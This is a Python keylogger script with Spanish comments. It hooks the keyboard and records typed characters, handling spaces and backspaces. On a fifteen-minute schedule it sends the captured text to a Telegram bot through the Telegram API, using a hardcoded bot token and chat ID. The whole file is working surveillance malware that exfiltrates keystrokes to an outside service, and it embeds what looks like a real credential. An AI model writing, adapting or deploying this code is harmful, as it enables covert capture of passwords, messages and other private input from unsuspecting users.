import keyboard
import threading
import time
import requests

TOKEN = "7705089492:AAFNPZ2jufblj91y4Q_XsB4KGKf_Q6sL_UE"
CHAT_ID = "6814112276"

intervalo_minutos = 15
capturando = False

def enviar_telegram(mensaje):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    data = {
        'chat_id': CHAT_ID,
        'text': mensaje
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Error al enviar a Telegram:", e)

def capturar_teclas():
    global capturando
    if capturando:
        return

    capturando = True
    print("[INFO] Capturando teclas...")

    teclas_capturadas = []

    def registrar_tecla(e):
        name = e.name
        if len(name) == 1:  # letra, número, símbolo
            teclas_capturadas.append(name)
        elif name == "space":
            teclas_capturadas.append(" ")
        elif name == "backspace":
            if teclas_capturadas:
                teclas_capturadas.pop()  # Elimina el último carácter

    keyboard.on_press(registrar_tecla)
    time.sleep(15)  # o 900 para 15 min
    keyboard.unhook_all()

    texto = "".join(teclas_capturadas)
    if texto.strip():
        enviar_telegram("Teclas presionadas:\n" + texto)
        print("[INFO] FIN. TECLAS CAPTURADAS Y MENSAJE ENVIADO")

    capturando = False

def planificador():
    while True:
        capturar_teclas()
        time.sleep(intervalo_minutos * 60)

threading.Thread(target=planificador, daemon=True).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Finalizado por el usuario.")
